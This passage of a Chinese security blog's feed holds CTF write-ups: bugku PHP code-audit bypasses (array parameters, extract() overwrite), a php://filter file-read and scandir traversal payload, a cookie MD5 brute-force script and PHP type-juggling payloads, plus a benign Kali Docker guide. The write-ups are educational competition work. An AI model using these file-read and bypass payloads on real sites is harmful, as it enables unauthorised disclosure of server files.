class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>两个函数遇见数组都返回NULL，就都绕过了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: ctf[]=1</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;bugku里一些简单的代码审计题&quot;&gt;&lt;a href=&quot;#bugku里一些简单的代码审计题&quot; class=&quot;headerlink&quot; title=&quot;bugku里一些简单的代码审计题&quot;&gt;&lt;/a&gt;bugku里一些简单的代码审计题&lt;/h1&gt;&lt;h2 id=&quot;extract变量覆盖&quot;&gt;&lt;a href=&quot;#extract变量覆盖&quot; class=&quot;headerlink&quot; title=&quot;extract变量覆盖&quot;&gt;&lt;/a&gt;extract变量覆盖&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://123.206.87.240:9009/1.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://123.206.87.240:9009/1.php&lt;/a&gt;&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$flag=&lt;span class=&quot;string&quot;&gt;&#39;xxx&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;extract($_GET);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($shiyan))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$content=trim(file_get_contents($flag));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($shiyan==$content)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&#39;flag&amp;#123;xxx&amp;#125;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&#39;Oh.no&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;首先extract函数用来将变量从数组中导入到当前的符号表中。这里要让$shiyan==$content,那么只要给$flag和$shiyan变量同时传入空值即可。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;payload:shiyan=&amp;amp;flag=&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="web安全学习笔记" scheme="http://chenxiyuan.vip/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://chenxiyuan.vip/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="ctf" scheme="http://chenxiyuan.vip/tags/ctf/"/>
    
      <category term="代码审计" scheme="http://chenxiyuan.vip/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="php" scheme="http://chenxiyuan.vip/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>kali安装docker</title>
    <link href="http://chenxiyuan.vip/2019/04/19/kali%E5%AE%89%E8%A3%85docker/"/>
    <id>http://chenxiyuan.vip/2019/04/19/kali安装docker/</id>
    <published>2019-04-19T00:42:49.000Z</published>
    <updated>2019-04-19T00:46:21.718Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">apt-get update</span><br><span class="line"></span><br><span class="line">apt-get install -y apt-transport-https ca-certificates</span><br><span class="line"></span><br><span class="line">apt-get install dirmngr</span><br></pre></td></tr></table></figure><h1 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &apos;deb https://apt.dockerproject.org/repo debian-stretch main&apos; &gt; /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure><h1 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">apt-get update</span><br><span class="line"></span><br><span class="line">apt-get install docker-engine</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第一步&quot;&gt;&lt;a href=&quot;#第一步&quot; class=&quot;headerlink&quot; title=&quot;第一步&quot;&gt;&lt;/a&gt;第一步&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;s
      
    
    </summary>
    
      <category term="kali" scheme="http://chenxiyuan.vip/categories/kali/"/>
    
    
      <category term="docker" scheme="http://chenxiyuan.vip/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑2019</title>
    <link href="http://chenxiyuan.vip/2019/04/07/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912019/"/>
    <id>http://chenxiyuan.vip/2019/04/07/西湖论剑2019/</id>
    <published>2019-04-07T01:58:56.000Z</published>
    <updated>2019-05-21T11:43:56.218Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CRYPTO哈夫曼之谜"><a href="#CRYPTO哈夫曼之谜" class="headerlink" title="CRYPTO哈夫曼之谜"></a>CRYPTO哈夫曼之谜</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">11000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110</span><br><span class="line"></span><br><span class="line">a:4</span><br><span class="line">d:9</span><br><span class="line">g:1</span><br><span class="line">f:5</span><br><span class="line">l:1</span><br><span class="line">0:7</span><br><span class="line">5:9</span><br><span class="line">&#123;:1</span><br><span class="line">&#125;:1</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> huffman</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line">t1=huffman.codebook([(<span class="string">'a'</span>, <span class="number">4</span>), (<span class="string">'d'</span>, <span class="number">9</span>), (<span class="string">'g'</span>, <span class="number">1</span>), (<span class="string">'f'</span>, <span class="number">5</span>),(<span class="string">'l'</span>, <span class="number">1</span>),(<span class="string">'0'</span>, <span class="number">7</span>),(<span class="string">'5'</span>, <span class="number">9</span>),(<span class="string">'&#123;'</span>, <span class="number">1</span>),(<span class="string">'&#125;'</span>, <span class="number">1</span>)])</span><br><span class="line">print(t1)</span><br><span class="line"><span class="comment">#&#123;'a': '000', 'd': '10', 'g': '00100', 'f': '110', 'l': '00101', '0': '111', '5': '01', '&#123;': '00111', '&#125;': '00110'&#125;</span></span><br><span class="line"><span class="comment">#得到f&#123;algddf5dfd0f05550500a5af55dd0d5d0ad&#125;，权重一样的位置可以交换，最后提交ddf5dfd0f05550500a5af55dd0d5d0ad成功</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>#babyt3<br><a href="http://ctf1.linkedbyx.com:10300" target="_blank" rel="noopener">http://ctf1.linkedbyx.com:10300</a><br>首页发现是任意文件读取，然后又看到hint，base64解码得到dir.php,然后用php伪协议读取dir.php，再base64解码<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf1.linkedbyx.com:10300/?file=php://filter/read=convert.base64-encode/resource=dir.php</span><br></pre></td></tr></table></figure></p><p>得到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'dir'</span>];</span><br><span class="line"><span class="keyword">if</span>(!$a)&#123;</span><br><span class="line">$a = <span class="string">'/tmp'</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(scandir($a));</span><br></pre></td></tr></table></figure></p><p>scandir() 函数返回指定目录中的文件和目录的数组,再同级和上级目录都试试，发现上级目录是存在文件的<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf1.linkedbyx.com:10300/dir.php?dir=/..</span><br></pre></td></tr></table></figure></p><p>返回目录信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(25) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(3) &quot;bin&quot; [4]=&gt; string(4) &quot;boot&quot; [5]=&gt; string(3) &quot;dev&quot; [6]=&gt; string(3) &quot;etc&quot; [7]=&gt; string(16) &quot;ffffflag_1s_Her4&quot; [8]=&gt; string(4) &quot;home&quot; [9]=&gt; string(3) &quot;lib&quot; [10]=&gt; string(5) &quot;lib64&quot; [11]=&gt; string(5) &quot;media&quot; [12]=&gt; string(3) &quot;mnt&quot; [13]=&gt; string(7) &quot;my_init&quot; [14]=&gt; string(10) &quot;my_service&quot; [15]=&gt; string(3) &quot;opt&quot; [16]=&gt; string(4) &quot;proc&quot; [17]=&gt; string(4) &quot;root&quot; [18]=&gt; string(3) &quot;run&quot; [19]=&gt; string(4) &quot;sbin&quot; [20]=&gt; string(3) &quot;srv&quot; [21]=&gt; string(3) &quot;sys&quot; [22]=&gt; string(3) &quot;tmp&quot; [23]=&gt; string(3) &quot;usr&quot; [24]=&gt; string(3) &quot;var&quot; &#125;</span><br></pre></td></tr></table></figure></p><p>发现ffffflag_1s_Her4，再读取就好了，得到flag<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf1.linkedbyx.com:10300/?file=/ffffflag_1s_Her4</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CRYPTO哈夫曼之谜&quot;&gt;&lt;a href=&quot;#CRYPTO哈夫曼之谜&quot; class=&quot;headerlink&quot; title=&quot;CRYPTO哈夫曼之谜&quot;&gt;&lt;/a&gt;CRYPTO哈夫曼之谜&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;11000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a:4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;d:9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;g:1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f:5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;l:1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0:7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5:9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;:1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;:1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; huffman&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; collections&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;t1=huffman.codebook([(&lt;span class=&quot;string&quot;&gt;&#39;a&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;), (&lt;span class=&quot;string&quot;&gt;&#39;d&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;), (&lt;span class=&quot;string&quot;&gt;&#39;g&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;), (&lt;span class=&quot;string&quot;&gt;&#39;f&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;),(&lt;span class=&quot;string&quot;&gt;&#39;l&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;),(&lt;span class=&quot;string&quot;&gt;&#39;0&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;),(&lt;span class=&quot;string&quot;&gt;&#39;5&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;),(&lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;),(&lt;span class=&quot;string&quot;&gt;&#39;&amp;#125;&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(t1)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&amp;#123;&#39;a&#39;: &#39;000&#39;, &#39;d&#39;: &#39;10&#39;, &#39;g&#39;: &#39;00100&#39;, &#39;f&#39;: &#39;110&#39;, &#39;l&#39;: &#39;00101&#39;, &#39;0&#39;: &#39;111&#39;, &#39;5&#39;: &#39;01&#39;, &#39;&amp;#123;&#39;: &#39;00111&#39;, &#39;&amp;#125;&#39;: &#39;00110&#39;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#得到f&amp;#123;algddf5dfd0f05550500a5af55dd0d5d0ad&amp;#125;，权重一样的位置可以交换，最后提交ddf5dfd0f05550500a5af55dd0d5d0ad成功&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://chenxiyuan.vip/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Pragyan CTF19 webwp</title>
    <link href="http://chenxiyuan.vip/2019/03/10/Pragyan-CTF19-webwp/"/>
    <id>http://chenxiyuan.vip/2019/03/10/Pragyan-CTF19-webwp/</id>
    <published>2019-03-10T06:14:22.000Z</published>
    <updated>2019-05-07T12:46:59.073Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Cookie-Monster-100"><a href="#Cookie-Monster-100" class="headerlink" title="Cookie Monster 100"></a>Cookie Monster 100</h2><p>Do prepare to see cookies lurking everywhere. <a href="http://159.89.166.12:13500/" target="_blank" rel="noopener">http://159.89.166.12:13500/</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">flag = []</span><br><span class="line">wordlist = string.printable</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">    cookie = s.get(<span class="string">'http://159.89.166.12:13500/'</span>).cookies[<span class="string">'flag'</span>]</span><br><span class="line">    flag.append(cookie)</span><br><span class="line"><span class="keyword">print</span> (flag)</span><br><span class="line"></span><br><span class="line">result= []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> permutations(wordlist,<span class="number">2</span>):</span><br><span class="line">        guess = <span class="string">""</span>.join(j)</span><br><span class="line">        md5 = hashlib.md5(guess.encode(<span class="string">"utf8"</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> md5 ==i:</span><br><span class="line">            result.append(guess)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> (result)</span><br></pre></td></tr></table></figure></p><a id="more"></a><h2 id="Game-of-Faces-100"><a href="#Game-of-Faces-100" class="headerlink" title="Game of Faces 100"></a>Game of Faces 100</h2><p>The Game of Faces, welcomes you. In this era, where AIs generate a lot of faces, we would like you to contribute to the same by uploading your image. Thank you for contributing, to continue.</p><p><a href="http://159.89.166.12:15000/" target="_blank" rel="noopener">http://159.89.166.12:15000/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">把css删掉，发现一个假的提交，得到一个base64，解码得The_scroll_says=the_night_kingVSvalyrian.txt，然后直接访问。。。</span><br><span class="line">http://159.89.166.12:15000/the_night_kingVSvalyrian.txt</span><br></pre></td></tr></table></figure></p><h2 id="Mandatory-PHP-125"><a href="#Mandatory-PHP-125" class="headerlink" title="Mandatory PHP 125"></a>Mandatory PHP 125</h2><p>PHP, PHP everywhere get the flag and earn your points there.</p><p><a href="http://159.89.166.12:14000/" target="_blank" rel="noopener">http://159.89.166.12:14000/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>; </span><br><span class="line">highlight_file(<span class="string">'index.php'</span>); </span><br><span class="line">$a = $_GET[<span class="string">"val1"</span>]; </span><br><span class="line">$b = $_GET[<span class="string">"val2"</span>]; </span><br><span class="line">$c = $_GET[<span class="string">"val3"</span>]; </span><br><span class="line">$d = $_GET[<span class="string">"val4"</span>]; </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^A-Za-z]/'</span>, $a)) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">'oh my gawd...'</span>); </span><br><span class="line">$a=hash(<span class="string">"sha256"</span>,$a); </span><br><span class="line">$a=(log10($a**(<span class="number">0.5</span>)))**<span class="number">2</span>;  <span class="comment">//传入 $a='pp';会发现 float(INF) php</span></span><br><span class="line"><span class="keyword">if</span>($c&gt;<span class="number">0</span>&amp;&amp;$d&gt;<span class="number">0</span>&amp;&amp;$d&gt;$c&amp;&amp;$a==$c*$c+$d*$d) <span class="comment">//这里也传入无限大</span></span><br><span class="line">$s1=<span class="string">"true"</span>; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Bye..."</span>); </span><br><span class="line"><span class="keyword">if</span>($s1===<span class="string">"true"</span>) </span><br><span class="line">    <span class="keyword">echo</span> $flag1; </span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">1</span>;$i&lt;=<span class="number">10</span>;$i++)&#123; </span><br><span class="line">    <span class="keyword">if</span>($b==urldecode($b))  <span class="comment">//编码11次</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'duck'</span>); </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        $b=urldecode($b); </span><br><span class="line">&#125;     </span><br><span class="line"><span class="keyword">if</span>($b===<span class="string">"WoAHh!"</span>) </span><br><span class="line">$s2=<span class="string">"true"</span>; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'oops..'</span>); </span><br><span class="line"><span class="keyword">if</span>($s2===<span class="string">"true"</span>) </span><br><span class="line">    <span class="keyword">echo</span> $flag2; </span><br><span class="line"><span class="keyword">die</span>(<span class="string">'end...'</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload: <a href="http://159.89.166.12:14000/?val1=pp&amp;val2=WoAHh%2525252525252525252521&amp;val3=1&amp;val4=100000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" target="_blank" rel="noopener">http://159.89.166.12:14000/?val1=pp&amp;val2=WoAHh%2525252525252525252521&amp;val3=1&amp;val4=100000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Cookie-Monster-100&quot;&gt;&lt;a href=&quot;#Cookie-Monster-100&quot; class=&quot;headerlink&quot; title=&quot;Cookie Monster 100&quot;&gt;&lt;/a&gt;Cookie Monster 100&lt;/h2&gt;&lt;p&gt;Do prepare to see cookies lurking everywhere. &lt;a href=&quot;http://159.89.166.12:13500/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://159.89.166.12:13500/&lt;/a&gt;&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span 